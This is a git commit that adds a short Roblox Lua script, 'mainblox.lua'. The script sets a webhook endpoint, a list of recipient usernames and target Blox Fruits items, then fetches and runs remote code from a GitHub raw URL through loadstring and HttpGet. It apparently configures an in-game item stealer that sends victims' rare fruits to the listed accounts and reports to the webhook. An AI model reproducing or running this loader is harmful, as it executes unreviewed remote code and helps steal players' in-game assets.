501eb52a8df427c82745f58d0c1af672b997e2a3
mainroblox <monkey.d.luffy552k9@gmail.com>
2025-04-10 19:26:57 +0700

    Create mainblox.lua

---
+++ mainblox.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aXRJN0pPUG5zbC1IOHV1WC1uMW5qUTpPWUNyRWUyWWt5ZXBORnpYVTRlckVMNm1yNVo5cWF3MmtLN0s2MVFKbEUyY3g0U0FpdlRIYVVRMmh3SnV2Y2JSRE9Yal9iaHh6Y1U4a0h1T0R2eUJCTjFnN3BWVnBjM0l2dHJSSWlCV0pMVVM4cERQbXZnS051eHJfZi1vMHlXRXg0djdxWlBNZDdCYmwtSWl2eWg3SUVpeGxOV0FUSlN0YVpQYWJUNmNFbU0" -- << Your Webhook
+Usernames = {"forfylgdiil", "tranchicong24", "Datcony11100", "mfzgnr"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
